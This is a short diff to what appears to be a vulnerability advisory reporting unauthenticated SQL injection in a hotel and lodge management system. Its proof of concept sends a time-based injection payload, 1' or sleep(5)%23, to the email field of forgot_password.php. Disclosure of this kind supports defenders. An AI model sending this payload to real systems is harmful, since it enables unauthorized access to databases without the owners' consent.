@@ -6,6 +6,7 @@ Hotel and Lodge Management System is vulnerable to unauthenticated SQL injection
 Proof of Concept:
 
 http://192.168.234.128/forgot_password.php
+
 POST:btn_forgot=1&email=1' or sleep(5)%23
 
 ![Image text](1.jpg)
